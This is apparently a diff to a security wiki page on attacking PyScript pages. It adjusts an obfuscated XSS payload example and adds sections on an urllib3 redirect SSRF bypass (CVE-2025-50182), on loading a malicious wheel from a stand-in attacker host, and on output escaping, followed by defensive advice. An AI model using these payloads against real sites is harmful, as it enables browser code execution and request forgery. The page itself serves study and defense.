@@ -95,7 +95,7 @@ Code:
 
 ```html
 <py-script>
-  prinht("
+  prinht(""
   <script>
     var _0x3675bf = _0x5cf5
     function _0x5cf5(_0xced4e9, _0x1ae724) {
@@ -157,7 +157,7 @@ Code:
       return _0x599c()
     }
   </script>
-  ")
+  "")
 </py-script>
 ```
 
@@ -180,7 +180,68 @@ Result:
 
 ![](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)
 
+---
+
+## New vulnerabilities & techniques (2023-2025)
+
+### Server-Side Request Forgery via uncontrolled redirects (CVE-2025-50182)
+
+`urllib3 < 2.5.0` ignores the `redirect` and `retries` parameters when it is executed **inside the Pyodide runtime** that ships with PyScript. When an attacker can influence target URLs, they may force the Python code to follow cross-domain redirects even when the developer explicitly disabled them ‑ effectively bypassing anti-SSRF logic.
+
+```html
+<script type="py">
+import urllib3
+http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
+r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
+print(r.status, r.url)
+</script>
+```
+
+Patched in `urllib3 2.5.0` – upgrade the package in your PyScript image or pin a safe version in `packages = ["urllib3>=2.5.0"]`. See the official CVE entry for details.
+
+### Arbitrary package loading & supply-chain attacks
+
+Since PyScript allows arbitrary URLs in the `packages` list, a malicious actor who can modify or inject configuration can execute **fully arbitrary Python** in the victim’s browser:
+
+```html
+<py-config>
+packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
+</py-config>
+<script type="py">
+import payload  # executes attacker-controlled code during installation
+</script>
+```
+
+*Only pure-Python wheels are required – no WebAssembly compilation step is needed.* Make sure configuration is not user-controlled and host trusted wheels on your own domain with HTTPS & SRI hashes.
+
+### Output sanitisation changes (2023+)
+
+* `print()` still injects raw HTML and is therefore XSS-prone (examples above).
+* The newer `display()` helper **escapes HTML by default** – raw markup must be wrapped in `pyscript.HTML()`.
+
+```python
+from pyscript import display, HTML
+
+display("<b>escaped</b>")          # renders literally
+
+display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
+```
+
+This behaviour was introduced in 2023 and is documented in the official Built-ins guide. Rely on `display()` for untrusted input and avoid calling `print()` directly.
+
+---
+
+## Defensive Best Practices
+
+* **Keep packages up to date** – upgrade to `urllib3 >= 2.5.0` and regularly rebuild wheels that ship with the site.
+* **Restrict package sources** – only reference PyPI names or same-origin URLs, ideally protected with Sub-resource Integrity (SRI).
+* **Harden Content Security Policy** – disallow inline JavaScript (`script-src 'self' 'sha256-…'`) so that injected `<script>` blocks cannot execute.
+* **Disallow user-supplied `<py-script>` / `<script type="py">` tags** – sanitise HTML on the server before echoing it back to other users.
+* **Isolate workers** – if you do not need synchronous access to the DOM from workers, enable the `sync_main_only` flag to avoid the `SharedArrayBuffer` header requirements.
+
+## References
+
+* [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
+* [PyScript Built-ins documentation – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
+
 {{#include ../../banners/hacktricks-training.md}}
-
-
-
